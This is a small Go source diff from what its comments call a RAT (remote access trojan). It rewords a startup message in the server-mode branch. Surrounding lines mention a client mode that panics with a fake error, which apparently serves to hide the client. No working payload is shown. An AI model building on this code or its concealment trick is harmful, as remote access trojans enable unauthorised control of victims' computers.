@@ -30,7 +30,7 @@ func main() {
 		// If the file is nonexistent or the file contains PRUN CLIENT
 		if bytes == nil || !strings.Contains(string(bytes), "PRUN CLIENT") {
 			// The RAT was run as client; starting
-			fmt.Println("Starting in server mode; NO CLIENT OPERATIONS STARTING.")
+			fmt.Println("Starting in server mode; remove the server flag to test the client.")
 			server.Init()
 		} else {
 			// Panic with a fake error
